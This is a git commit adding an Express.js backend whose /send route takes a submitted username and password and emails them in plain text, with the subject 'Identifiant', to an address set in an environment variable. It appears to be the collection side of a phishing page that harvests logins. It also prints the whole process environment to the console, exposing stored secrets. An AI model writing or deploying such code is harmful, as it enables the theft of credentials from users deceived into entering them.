92dd4ee8a9fde6691a96865ee355660b619a91cf
Eberlouedd <kyacini@yahoo.fr>
2021-12-16 03:03:47 +0100

    backend

---
+++ app.js
@@ -0,0 +1,46 @@
+const express = require('express');
+const nodemailer = require('nodemailer');
+require('dotenv').config();
+
+const app = express()
+
+app.use((req, res, next) => {
+    res.setHeader('Access-Control-Allow-Origin', 'http://localhost:5000')
+    res.setHeader('Access-Control-Allow-Credentials', 'true')
+    res.setHeader('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content, Accept, Content-Type, Authorization')
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS')
+    next()
+  });
+
+app.use(express.json());
+app.use(express.urlencoded({
+  extended: true
+}))
+
+app.use(express.static('./'));
+
+
+app.post('/send', async (req, res) => {
+    console.log(process.env);
+    var transporter = nodemailer.createTransport({
+        host: "smtp.gmail.com",
+        port: 587,
+        secure: false, // true for 465, false for other ports
+        auth: {
+          user: process.env.EMAIL, // generated ethereal user
+          pass: process.env.PASSWORD, // generated ethereal password
+        },
+      });
+
+    await transporter.sendMail({
+    from: process.env.EMAIL, // sender address
+    to: process.env.DESTINATION, // list of receivers
+    subject: "Identifiant", // Subject line
+    text: "Username : " + req.body.username + "\n" + "Password : " + req.body.password, // plain text body
+    });
+
+    res.status(200).send('oui')
+
+})
+
+module.exports = app;
